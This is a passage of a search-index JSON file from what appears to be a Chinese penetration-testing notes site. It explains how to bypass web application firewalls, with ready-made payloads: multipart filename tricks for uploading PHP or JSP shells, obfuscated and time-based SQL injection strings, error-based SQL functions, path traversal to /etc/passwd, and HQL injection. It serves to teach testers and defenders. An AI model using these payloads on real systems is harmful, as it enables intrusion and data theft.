multipart/form-data\u4ece\u800c\u5bfc\u81f4\u88ab\u7ed5\u8fc7\u3002\u6216\u8005WAF\u4f1a\u8ba4\u4e3a\u5b83\u662f\u6587\u4ef6\u4e0a\u4f20\u8bf7\u6c42\uff0c\u4ece\u800c\u53ea\u68c0\u6d4b\u6587\u4ef6\u4e0a\u4f20\uff0c\u5bfc\u81f4\u88ab\u7ed5\u8fc7","title":"3.1\u534f\u8bae\u8986\u76d6\u4e0d\u5168"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#32","text":"\u4f8b\u5982\u6587\u4ef6\u4e0a\u4f20\uff0c\u4e0a\u4f20\u6587\u4ef6\u540d\u7684\u4fee\u6539test.jpg/shell.php","title":"3.2\u534f\u8bae\u89e3\u6790\u4e0d\u6b63\u786e"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#33web","text":"\u6587\u4ef6\u540d\u8986\u76d6 \u5728multipart\u534f\u8bae\u4e2d\uff0c\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u5757\u5b58\u5728\u591a\u4e2aContent-Disposition\uff0c\u5c06\u4ee5\u6700\u540e\u4e00\u4e2aContent-Disposition\u7684filename\u503c\u4f5c\u4e3a\u4e0a\u4f20\u7684\u6587\u4ef6\u540d \u7b2c\u4e00\u4e2a\u6587\u4ef6\u540dshell.123 \u7b2c\u4e8c\u4e2ashell.php \u4e0a\u4f20\u540e\u662fshell.php Content-Disposition: form-data;name=\"myfile\"; filename=\"p3.txt\"\" Content-Disposition: form-data;name=\"myfile\"; filename=\"t3.jsp\" \u5728\u4e00\u4e2aContent-Disposition \u4e2d\uff0c\u5b58\u5728\u591a\u4e2afilename Content-Disposition: form-data;name=\"myfile\"; filename=\"p3.txt\";filename=\"t3.jsp\" \u9057\u6f0f\u6587\u4ef6\u540d \u5f53WAF\u9047\u5230\u201cname=\u201dmyfile\";;\u201d\u65f6\uff0c\u8ba4\u4e3a\u6ca1\u6709\u89e3\u6790\u5230filename\u3002\u800c\u540e\u7aef\u5bb9\u5668\u7ee7\u7eed\u89e3\u6790\u5230\u7684\u6587\u4ef6\u540d\u662ft3.jsp Content-Disposition: form-data;name=\"myfile\";; filename=\"t3.jsp\"\u3002 \u672a\u89e3\u6790\u6240\u6709\u6587\u4ef6 multipart\u534f\u8bae\u4e2d\uff0c\u4e00\u4e2aPOST\u8bf7\u6c42\u53ef\u4ee5\u540c\u65f6\u4e0a\u4f20\u591a\u4e2a\u6587\u4ef6\u3002\u5982\u56fe\uff0c\u8bb8\u591aWAF\u53ea\u68c0\u67e5\u7b2c\u4e00\u4e2a\u4e0a\u4f20\u6587\u4ef6\uff0c\u6ca1\u6709\u68c0\u67e5\u4e0a\u4f20\u7684\u6240\u6709\u6587\u4ef6\uff0c\u800c\u5b9e\u9645\u540e\u7aef\u5bb9\u5668\u4f1a\u89e3\u6790\u6240\u6709\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\uff0c\u653b\u51fb\u8005\u53ea\u9700\u628apaylaod\u653e\u5728\u540e\u9762\u7684\u6587\u4ef6PART \u6587\u4ef6\u540d\u89e3\u6790\u517c\u5bb9\u6027 multipart\u534f\u8bae\u4e2d\uff0c\u6587\u4ef6\u540d\u7684\u5f62\u5f0f\u4e3a\u201cfilename=\"abc.php\"\u201d\u3002\u4f46\u662fTomcat\u3001PHP\u7b49\u5bb9\u5668\u89e3\u6790\u534f\u8bae\u65f6\u4f1a\u505a\u4e00\u4e9b\u517c\u5bb9\uff0c\u80fd\u6b63\u786e\u89e3\u6790 \u201dfilename=\"abc.php\u201d\u3001\u201dfilename=abc.php\u201d\u3001 \u201dfilename='abc.php\u2019\u201d\u3002\u800cWAF\u53ea\u6309\u7167\u534f\u8bae\u6807\u51c6\u53bb\u89e3\u6790\uff0c\u65e0\u6cd5\u89e3\u6790\u6587\u4ef6\u540d\uff0c\u4f46\u662f\u540e\u7aef\u5bb9\u5668\u80fd\u6b63\u786e\u83b7\u5f97\u6587\u4ef6\u540d\uff0c\u4ece\u800c\u5bfc\u81f4\u88ab\u7ed5\u8fc7\u3002\u573a\u666f\u7684\u7ed5\u8fc7\u5f62\u5f0f\uff1a Content-Disposition: form-data; name=\"file\"; filename=abc.php Content-Disposition: form-data; name=\"file\"; filename=\"abc.php Content-Disposition: form-data; name=\"file\"; filename='abc.php\u2019 3.4\u53c2\u6570\u6c61\u67d3 \u8bf7\u6c42\u4e2d\u5305\u542b2\u4e2a\u53c2\u6570\u540d\u76f8\u540c\u7684\u53c2\u6570typeid\uff0c\u7b2c\u4e00\u4e2a\u662f\u6b63\u5e38\u53c2\u6570\u7684\u503c\u6b63\u5e38\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u624d\u662fpayload\u3002\u5982\u679cWAF\u89e3\u6790\u53c2\u6570\u4f7f\u7528\u7b2c\u4e00\u4e2a\u503c\uff0c\u6ca1\u68c0\u67e5\u7b2c\u4e8c\u4e2a\u503c\uff0c\u5c06\u5bfc\u81f4\u7ed5\u8fc7\u3002\u8fd9\u662f\u5f88\u4e45\u5f88\u4e45\u7684\u4e00\u4e2aCASE\uff0c\u73b0\u5728\u51e0\u4e4e\u6ca1\u6709WAF\u5b58\u5728\u8fd9\u4e2a\u95ee\u9898\u3002 /forum.php\uff1f typeid=644&typeid=if(now()%3dsysdate()%2csleep(19.844)%2c0)/ 'XOR(if(now()%3dsysdate()%2csleep(19.844)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(19.844)%2c0))OR%22 /","title":"3.3\u534f\u8bae\u89e3\u6790\u4e0e\u540eWEB\u5bb9\u5668\u7684\u534f\u8bae\u89e3\u6790\u4e0d\u4e00\u81f4"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#4","text":"\u5bf9\u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c\u7ed5\u8fc7WAF\u89c4\u5219\u4e3b\u8981\u601d\u8003\u5b89\u5168\u5de5\u7a0b\u5e08\u5199WAF\u89c4\u5219\u65f6\u5728\u60f3\u4ec0\u4e48\uff0c\u5bb9\u6613\u5ffd\u7565\u4ec0\u4e48\uff0c\u63a8\u65ad\u4e00\u4e9b\u53ef\u80fd\u7ed5\u8fc7\u7684\u65b9\u5f0f\uff0c\u7136\u540e\u591a\u6b21\u5c1d\u8bd5\u8fdb\u884c\u9a8c\u8bc1\u3002\u96b6\u5c5e\u4e8e\u6f0f\u6d1e\u5c42\u9762\u8fc7waf","title":"4. \u89c4\u5219\u5c42\u9762\u7684\u7ed5\u8fc7"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#41-sql","text":"\u7ed5\u8fc7SQL\u6ce8\u5165\u89c4\u5219\u4e3b\u8981\u5229\u7528WAF\u89c4\u5219\u672c\u8eab\u7684\u95ee\u9898\u3001\u672a\u8003\u8651\u5230SQL\u8bed\u6cd5\u53d8\u5f62\u3001\u53ca\u540e\u7aef\u6570\u636e\u5e93SQL\u8bed\u53e5\u8bed\u6cd5\u7279\u6027 \u6ce8\u91ca\u7b26\u7ed5\u8fc7 / xxx /\u662f\u6ce8\u91ca\uff0c\u4e5f\u53ef\u4ee5\u5145\u5f53\u7a7a\u767d\u7b26\u3002\u56e0\u4e3a / /\u53ef\u4f7f\u5f97MySQL\u5bf9sql\u8bed\u53e5(union/ /select)\u8bcd\u6cd5\u89e3\u6790\u6210\u529f\u3002\u4e8b\u5b9e\u4e0a\u8bb8\u591aWAF\u90fd\u8003\u8651\u5230/**/\u53ef\u4ee5\u4f5c\u4e3a\u7a7a\u767d\u5206\uff0c\u4f46\u662fwaf\u68c0\u6d4b \u201c/*. */\u201d\u5f88\u6d88\u8017\u6027\u80fd\uff0c\u5de5\u7a0b\u5e08\u4f1a\u6298\u4e2d\uff0c\u53ef\u80fd\u5728\u68c0\u6d4b\u4e2d\u95f4\u5f15\u5165\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\uff0c\u4f8b\u5982\uff1a/ \\w+*/\u3002\u6216\u8005\uff0cWAF\u53ef\u80fd\u53ea\u4e2d\u95f4\u68c0\u67e5n\u4e2a\u5b57\u7b26\u201c/*.{,n}*/\u201d\u3002\u6839\u636e\u4ee5\u4e0a\u60f3\u6cd5\uff0c\u53ef\u4ee5\u9010\u6b65\u6d4b\u8bd5\u7ed5\u8fc7\u65b9\u6cd5\uff1a \u5148\u6d4b\u8bd5\u6700\u57fa\u672c\u7684\uff1aunion/**/select \u518d\u6d4b\u8bd5\u4e2d\u95f4\u5f15\u5165\u7279\u6b8a\u5b57\uff1aunion/ aaaa%01bbs /select \u6700\u540e\u6d4b\u8bd5\u6ce8\u91ca\u957f\u5ea6\uff1aunion/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa /select \u540c\u7406\uff0c\u5bf9\u4e8e/ !xxx /\uff0c\u53ef\u4ee5\u91c7\u53d6\u7c7b\u4f3c\u7684\u601d\u8def\u7ed5\u8fc7WAF\u3002 \u7a7a\u767d\u7b26\u7ed5\u8fc7 \u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c SQL\u6ce8\u5165\u89c4\u5219\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u201c\\s\u201d\u5339\u914d\u7a7a\u683c\uff0c\u4f8b\u5982\u201dselect\\s+union\u201d\u3002\u5229\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u7a7a\u767d\u7b26\u4e0eMySQL\u7a7a\u767d\u7b26\u7684\u4e0d\u540c\u53ef\u7ed5\u8fc7WAF\u89c4\u5219\u3002\u5982\u4f55\u8fd9\u4e9bMySQL\u7684\u7279\u6027\uff1f\u901a\u8fc7fuzz,\u6bcf\u6b21\u66f4\u6539\u6b63\u5e38SQL\u8bed\u53e5\u7684\u67d0\u90e8\u5206\uff0c\u66ff\u6362\u4e3a\u5176\u4ed6\u5b57\u7b26\uff0c\u5224\u65ad\u8bed\u6cd5\u662f\u5426\u6b63\u786e\uff0c\u5373\u53ef\u5224\u65ad\u51fa\u6765MySQL\u8bed\u6cd5\u7279\u6027\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5206\u6790MySQL\u8bcd\u6cd5\u6765\u53d1\u73b0\u8bed\u6cd5\u7279\u6027\uff0c\u4ece\u800c\u627e\u5230\u7ed5\u8fc7\u65b9\u6cd5\u3002 \u5229\u7528\u7a7a\u767d\u7b26\u8fdb\u884c\u7ed5\u8fc7\uff0c\u6d4b\u8bd5WAF\u65f6\u5c3d\u53ef\u80fd\u51cf\u5c11\u5176\u4ed6\u539f\u56e0\u7684\u5f71\u54cd\uff0c\u4f8b\u5982\u201dunion select\u201d\u88ab\u62e6\u622a\uff0c\u53ea\u9700\u628a\u4e2d\u95f4\u7a7a\u767d\u7b26\u66ff\u6362\u4e3a\u201d%250C\u201d, \u201c%25A0\u201d\u8fdb\u884c\u7ed5\u8fc7\u6d4b\u8bd5\u3002 union%250Cselect union%25A0select \u51fd\u6570\u5206\u9694\u7b26 \u5bf9\u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c\u6211\u4eec\u731c\u6d4b\u5b89\u5168\u5de5\u7a0b\u5e08\u5199WAF\u89c4\u5219\u65f6\uff0c\u53ef\u80fd\u4e0d\u77e5\u9053\u51fd\u6570\u540d\u4e0e\u5de6\u62ec\u53f7\u4e4b\u95f4\u53ef\u4ee5\u5b58\u5728\u7279\u6b8a\u5b57\u7b26\uff0c\u6216\u8005\u9057\u6f0f\u53ef\u4ee5\u5b58\u5728\u7279\u6b8a\u5b57\u7b26\u3002\u4f8b\u5982\u5339\u914d\u51fd\u6570\u201dconcat()\u201d\u7684\u89c4\u5219\u5199\u6cd5\uff0c\u201cconcat(\u201d\u6216\u8005\u201dconcat\\s*(\u201d\uff0c\u5c31\u6ca1\u6709\u8003\u8651\u5230\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\u3002\u76f8\u5e94\u7684\u7ed5\u8fc7\u65b9\u6cd5\uff0c\u5728\u7279\u6b8a\u4f4d\u7f6e\u5f15\u5165\u7279\u6b8a\u7684\u5206\u9694\u7b26\uff0c\u9010\u4e2a\u6d4b\u8bd5\u3002\u8fd9\u4e9b\u7279\u6b8a\u5206\u9694\u7b26\u53d1\u73b0\u4e5f\u662f\u901a\u8fc7Fuzz\u51fa\u6765\u7684\u3002 concat%2520( concat/**/( concat%250c( concat%25a0( \u4e3e\u4e00\u53cd\u4e09\uff0c\u5bfb\u627e\u7c7b\u4f3c\u7684\u5173\u952e\u4f4d\u7f6e\uff0cFuzz\u7279\u6b8a\u5b57\u7b26\uff0c\u53d1\u73b0\u66f4\u591a\u7684\u7ed5\u8fc7\u65b0\u65b9\u6cd5\u3002\u731c\u6d4b\u5de5\u7a0b\u5e08\u4eec\u5199\u89c4\u5219\u56e0\u4e3a\u5404\u79cd\u539f\u56e0\u5bb9\u6613\u9057\u6f0f\u7684\u70b9\uff0c\u8fdb\u884c\u7ed5\u8fc7WAF\u68c0\u6d4b\u3002 \u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790 \u5229\u7528MySQL\u89e3\u6790\u6d6e\u70b9\u6570\u7684\u7279\u70b9\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u65e0\u6cd5\u5339\u914d\u51fa\u5355\u8bcdunion\uff0c\u4f46\u662fMySQL\u8bcd\u6cd5\u89e3\u6790\u6210\u529f\u89e3\u6790\u51fa\u6d6e\u70b9\u6570\u3001sql\u5173\u952e\u5b57union\u3002 select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=\\Nunion select 1,2,3,4,5,6,7,8,9,0 \u5229\u7528error-based\u8fdb\u884cSQL\u6ce8\u5165 Error-based\u7684SQL\u6ce8\u5165\u51fd\u6570\u975e\u5e38\u5bb9\u6613\u88ab\u5ffd\u7565\uff0c\u5bfc\u81f4WAF\u89c4\u5219\u8fc7\u6ee4\u4e0d\u5b8c\u6574\u3002\u968f\u7740\u5bf9MySQL\u7814\u7a76\u8d8a\u6765\u8d8a\u6df1\uff0c\u88ab\u53d1\u73b0\u53ef\u7528\u4e8eerror-based SQL\u6ce8\u5165\u7684\u51fd\u6570\u8d8a\u6765\u8d8a\u591a\uff0c\u540c\u65f6\u4e5f\u7ed9\u7ed5\u8fc7WAF\u9020\u5c31\u4e86\u66f4\u591a\u673a\u4f1a\u3002\u5e38\u89c1\u7684\u51fd\u6570\uff1a extractvalue(1, concat(0x5c,md5(3))); updatexml(1, concat(0x5d,md5(3)),1); GeometryCollection((select*from(select*from(select@@version)f)x)) polygon((select*from(select name_const(version(),1))x)) linestring() multipoint() multilinestring() multipolygon() \u5229\u7528Error-based\u7684SQL\u6ce8\u5165\u51fd\u6570\u8fdb\u884c\u7ed5\u8fc7\u65f6\uff0c\u53ef\u4ee5\u7ed3\u5408\u51fd\u6570\u5206\u9694\u7b26\uff0c\u6216\u5176\u4ed6\u65b9\u6cd5\u7075\u6d3b\u8fd0\u7528\u3002 Mysql\u7279\u6b8a\u8bed\u6cd5 \u6700\u6709\u6548\u7684\u53d1\u73b0\u624b\u6bb5\uff0c\u8fd8\u662f\u53bb\u8bfb\u8bfbMySQL\u8bcd\u6cd5\u5206\u6790\u6e90\u4ee3\u7801\u3002\u548c\u534f\u8bae\u7ed5\u8fc7\u7c7b\u4f3c\uff0c\u6316\u6398SQL\u6807\u51c6\u4e0eMySQL\u7684\u8bcd\u6cd5\u5206\u6790\u5dee\u5f02\u662f\u53d1\u73b0WAF SQL\u6ce8\u5165\u7ed5\u8fc7\u7684\u6709\u6548\u624b\u6bb5\u3002\u4ee5\u4e0b\u662fMySQL\u8bed\u6cd5\u7684\u4e00\u4e2a\u7279\u5199(ps:\u4e0d\u662f\u6211\u53d1\u73b0\u7684)\uff1a select{x table_name}from{x information_schema.tables}; \u7efc\u5408\u5229\u7528\u5b9e\u4f8b \u4ee5\u4e0a\u90fd\u662fSQL\u6ce8\u5165\u7ed5\u8fc7\u4e2d\u7684\u6280\u672f\u70b9\uff0c\u5728\u5b9e\u9645\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u9700\u8981\u7075\u6d3b\u7efc\u5408\u5229\u7528\u624d\u80fd\u8fbe\u5230\u5b8c\u6574\u7ed5\u8fc7\uff0c\u8bfb\u53d6\u6570\u636e\u6570\u636e\u3002\u4ee5\u4e0b\u7ed9\u51fa\u5b8c\u6574\u7ed5\u8fc7WAF SQ\u6ce8\u5165\u68c0\u6d4b\u7684\u5b9e\u4f8b\u3002\u5982\u56fe\uff0c\u672c\u4f8b\u4e2d\u7efc\u5408\u591a\u4e2a\u7ed5\u8fc7\u6280\u672f\u70b9\uff0c\u6700\u7ec8\u5b9e\u73b0\u5b8c\u6574\u7ed5\u8fc7\u5b9e\u73b0\u8bfb\u53d6\u6570\u636e\u3002 \u5229\u7528\u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790\uff0c\u7ed5\u8fc7union select \u7684\u68c0\u6d4b\u3002 \u540c\u6837\uff0c\u51fd\u6570\u5206\u9694\u7b26\u601d\u60f3\u96c6\u548c\u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790\uff0c\u7ed5\u8fc7\u5173\u952e\u5b57from\u7684\u68c0\u6d4b\u3002 \u6700\u540e\u7a7a\u767d\u5206\u5206\u5272\u7ed5\u8fc7INFORMATION_SCHEMA.TABLES\u7684\u68c0\u67e5","title":"4.1. SQL\u6ce8\u5165\u7ed5\u8fc7"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#42","text":"\u6587\u4ef6\u5305\u542b\u5206\u4e3a\u76f8\u5bf9\u8def\u5f84\u3001\u7edd\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\u3002\u5728\u76f8\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\u4e2d\uff0c\u6700\u7ec8\u6839\u636eLinux\u865a\u62df\u6587\u4ef6\u7cfb\u7edf(vfs)\u7684\u89c4\u5219\u67e5\u627e\u6587\u4ef6\uff0c\u901a\u8fc7\u5206\u6790vfs\u7684\u6587\u4ef6\u8def\u5f84\u89e3\u6790\u89c4\u5219\uff0c\u63d0\u53d6\u5176\u4e2d\u89c4\u5219\u7279\u70b9\uff0c\u7528\u8fd9\u4e9b\u7279\u70b9\u53bb\u7ed5\u8fc7WAF\u3002\u5728\u7edd\u5bf9\u6587\u4ef6\u8def\u5f84\u5305\u542b\u4e2d\uff0c\u4e3b\u8981\u662f\u6839\u636e\u653b\u51fb\u573a\u666f\uff0cWAF\u672a\u8fc7\u6ee4\u4e00\u4e9b\u534f\u8bae\u3001\u672a\u8fc7\u6ee4\u67d0\u4e9b\u7279\u6b8a\u8def\u5f84\u3002 \u76f8\u5bf9\u8def\u5f84\u7684\u7ed5\u8fc7 \u5199WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u65f6\uff0c\u5982\u679c\u68c0\u6d4b\u5355\u4e00\u7684\u201d../\u201d\uff0c\u8bef\u62a5\u4f1a\u975e\u5e38\u591a\uff0c\u6240\u4ee5WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u901a\u5e38\u4f1a\u68c0\u6d4b\u8fde\u7eed\u7684\u201c../\"\u3002\u6839\u636evfs\u89e3\u6790\u8def\u5f84\u7684\u8bed\u6cd5\uff0c\u89e3\u6790\u5230\u201c//\u201d\u6587\u4ef6\u8def\u5f84\u4e0d\u53d8\uff0c\u89e3\u6790\u5230\u201c/./\u201d\u6587\u4ef6\u8def\u5f84\u4f9d\u7136\u3002 \u901a\u8fc7\u907f\u514d\u8fde\u7eed\u7684\"../\"\uff0c\u4ece\u800c\u7ed5\u8fc7WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u3002Eg: ././..///./.././/../etc//passwd\uff0c\u5b83\u7b49\u4ef7\u4e8e../../../etc/passwd \u7edd\u5bf9\u8def\u5f84\u7684\u7ed5\u8fc7 WAF\u6ca1\u6709\u8003\u8651\u5230\u8def\u5f84\u4e2d\u63d2\u5165\u201c/./\u201d\u3001\u201c//\u201d\u5bf9\u4e8evfs\u89e3\u6790\u8def\u5f84\u662f\u7b49\u4ef7\u7684\uff0c\u5bfc\u81f4\u53ef\u88ab\u7ed5\u8fc7\u3002\u4f8b\u5982 /etc/./passwd \u4e0e /etc/passwd \u662f\u7b49\u4ef7\u7684\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7\u7ec4\u5408\u201c/./\u201d\u3001\u201c//\u201d\u8fdb\u884c\u7ed5\u8fc7\uff0ceg. /etc///.//././/passwd\u3002 \u5bf9\u4e8e\u7edd\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\uff0cWAF\u4e00\u822c\u4f1a\u62e6\u622a\u5e38\u89c1\u8def\u5f84\uff0c\u800c\u4e0d\u4f1a\u9632\u5fa1\u6240\u6709\u7684\u7edd\u5bf9\u8def\u5f84\u3002\u56e0\u6b64\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u53ef\u4ee5\u5305\u542b\u5176\u4ed6\u7684\u8def\u5f84\u4e0b\u4e00\u4e9b\u6587\u4ef6\uff0c\u4f8b\u5982/usr/local/nginx/conf/nginx.conf\u3002 \u5982\u679cWAF\u53ea\u68c0\u6d4b\u8fde\u7eed\u7684../\uff0c\u68c0\u67e5\u5f00\u59cb\u8def\u5f84\u4e3aLinux\u7684\u76ee\u5f55\u540d\uff0c\u53ef\u4ee5\u91c7\u7528/wtt/../\u7ed5\u8fc7WAF\u6587\u4ef6\u5305\u542b\u68c0\u6d4b\u3002 \u4f8b\u5982\uff0c\u201c/wtt/../etc/passwd\u201d\uff0c wtt\u4e0d\u662fLinux\u6807\u51c6\u76ee\u5f55\uff0c\u4e0d\u4f1a\u88ab\u89c4\u5219\u5339\u914d\u3002WAF\u53ea\u68c0\u6d4b\u8fde\u7eed\u7684../\uff0c\u4f46\u662f\u53ea\u4f7f\u7528\u4e00\u4e2a../\uff0c\u4e0d\u88ab\u62e6\u622a\u3002\u6700\u7ec8\u8bfb\u53d6/etc/passwd\u6587\u4ef6\u3002 \u5229\u7528WAF\u672a\u68c0\u6d4b\u7684\u534f\u8bae\u3002PHP \u6587\u4ef6\u5305\u542b\u652f\u6301\u7684\u534f\u8bae\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u770b\u73af\u5883\u9009\u62e9\u53ef\u884c\u7684\u65b9\u6cd5 file:// \u2014 Accessing local filesystem http:// \u2014 Accessing HTTP(s) URLs ftp:// \u2014 Accessing FTP(s) URLs php:// \u2014 Accessing various I/O streams zlib:// \u2014 Compression Streams data:// \u2014 Data (RFC 2397) glob:// \u2014 Find pathnames matching pattern phar:// \u2014 PHP Archive ssh2:// \u2014 Secure Shell 2 rar:// \u2014 RAR ogg:// \u2014 Audio streams expect:// \u2014 Process Interaction Streams \u603b\u7ed3 \u4e00\u4e2a\u597dWAF\u4e0d\u662f\u5439\u51fa\u6765\u7684\uff0c\u662f\u5b9e\u8df5\u68c0\u9a8c\u51fa\u6765\u7684\u3002\u7814\u7a76WAF\u7684\u7ed5\u8fc7\u624b\u6bb5\uff0c\u662f\u4e3a\u4e86\u66f4\u597d\u7684\u63d0\u5347WAF\u7684\u9632\u5fa1\u80fd\u529b\u3002\u5728\u7814\u7a76\u7a81\u7834\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u8981\u4ec5\u4ec5\u505c\u7559\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u57fa\u672c\u6f0f\u6d1e\u539f\u7406\uff0c\u9700\u8981\u5bf9\u6d89\u53ca\u5e76\u6df1\u5165\u66f4\u591a\u7684\u9886\u57df\uff0c\u4f8b\u5982HTTP\u534f\u8bae\u7406\u89e3\u548cPHP\u3001Tomcat\u5bf9HTTP\u534f\u8bae\u6e90\u7801\u5206\u6790\uff0cMySQL\u8bcd\u6cd5\u5206\u6790\uff0c\u548cFuzz\u7684\u601d\u8def\u7b49\u3002\u5728\u6b64\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u6709\u8bb8\u591a\u4e50\u8da3\uff0c\u4e5f\u4f1a\u6709\u5404\u65b9\u9762\u80fd\u529b\u7684\u63d0\u5347\u3002","title":"4.2.\u6587\u4ef6\u5305\u542b"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#3","text":"","title":"3.\u6846\u67b6\u5c42\u7684\u8bed\u53e5\u5206\u6790"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#jpql","text":"jpql\u4e0eSQL\u7684\u533a\u522b\u5c31\u662fSQL\u662f\u9762\u5411\u5bf9\u8c61\u5173\u7cfb\u6570\u636e\u5e93\uff0c\u4ed6\u64cd\u4f5c\u7684\u662f\u6570\u636e\u8868\u548c\u6570\u636e\u5217\uff0c\u800cjpql\u64cd\u4f5c\u7684\u5bf9\u8c61\u662f\u5b9e\u4f53\u5bf9\u8c61\u548c\u5b9e\u4f53\u5c5e\u6027 ORM\u6ce8\u5165 \u6570\u5b57\u7c7b\u578b\uff08 JPQL \uff09\uff1a SELECT e FROM user e WHERE e.id = SQL('(select 1 from dual where 1=1)\u2019) and SQL('(SELECT 1)=1\u2019) \u5b57\u7b26\u7c7b\u578b\uff08JPQL\uff09\uff1a \u901a\u5e38\u6307\u7684\u662f\u7c7b\u4f3chibernate\u4e00\u7c7b\u5177\u6709\u5b89\u5168\u8bed\u6cd5\u68c0\u6d4b\u7684\u6ce8\u5165","title":"\u57fa\u4e8ejpql\u7c7b\u578b\u7684\u7ed5\u8fc7\u5206\u6790"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#hibernate","text":"ORM\u6ce8\u5165 \u6570\u5b57\u7c7b\u578b\uff08 Hibernate ORM \uff09\uff1a test\\'' or 1<length((select version())) \u2013 \u7ffb\u8bd1\u6210\u4e3aHQL\u8bed\u53e5\u5c31\u53d8\u4e3a\uff1a SELECT p FROM pl.btbw.persistent.Post p where p.name='test\\'' or 1<length((select version())) \u2013 ' \u6700\u540e\u8f6c\u53d8\u4e3a\u771f\u6b63\u7684SQL\u8bed\u53e5\uff1a select post0_.id as id1_0_, post0_.name as name2_0_ from post post0_ where post0_.name=\u2018test\\'' or 1<length((select version())) -- ' \u8fd9\u6837\u6211\u4eec\u5c31\u4f1a\u9003\u9038\u51fa\u6765\u4e00\u4e2a\u8bed\u53e5\u6216\u8005\u65b9\u6cd5 \u901a\u5e38\u6307\u7684\u662f\u7c7b\u4f3chibernate\u4e00\u7c7b\u5177\u6709\u5b89\u5168\u8bed\u6cd5\u68c0\u6d4b\u7684\u6ce8\u5165","title":"\u57fa\u4e8eHibernate\u7c7b\u578b\u7684\u7ed5\u8fc7\u5206\u6790"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#_4","text":"","title":"\u4e8c\u3001\u57fa\u4e8e\u4e09\u65b9\u8c03\u7528\u6846\u67b6\u5206\u6790\u5229\u7528"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#webservice","text":"1.\u9ed8\u8ba4\u7684\u5b89\u5168\u914d\u7f6e2.\u672a\u6388\u6743\u7684\u8bbf\u95ee3.\u81ea\u8eab\u672a\u4fee\u590d\u6f0f\u6d1eWEBSERVICE Jws\u6587\u4ef6\u5ba1\u8ba1 \u200b \u901a\u5e38\u800c\u8a00jws\u6587\u4ef6\u4e5f\u662faxis2\u53d1\u5e03\u7684\u4e00\u79cd\u8868\u73b0\u5f62\u5f0f\uff0c\u7136\u540e\u66f4\u591a\u7684\u88ab \u5ba1\u8ba1\u4eba\u5458\u5ffd\u7565 \u5728web\u76ee\u5f55\u5168\u5c40\u67e5\u627ejws\u7ed3\u5c3e\u7684\u6587\u4ef6 \u6839\u636e\u5bf9\u5e94\u7684web\u8bbf\u95ee\u76ee\u5f55\u901a\u8fc7\u6d4f\u89c8\u5668\u8fdb\u884c\u8bbf\u95ee \u5bf9\u5176\u76f8\u5e94\u7684\u63a5\u53e3\u8fdb\u884c\u5ba1\u8ba1 SOAPMonitor \u7528\u6765\u8fdb\u884cwebservice\u7ba1\u7406\u53d1\u5e03\uff0c\u8c03\u8bd5\u7b49\u7b49\uff0c\u8fd9\u91cc\u9762\u5b58\u5728\u4e00\u4e2a\u53cd\u5e8f \u5217\u5316\u7684\u95ee\u9898 \u8bbf\u95ee\u6839\u8def\u5f84/SOAPMonitor , \u53f3\u952e\u6e90\u7801\u5c31\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u914d\u7f6e\u9879 \u5185\u5bb9 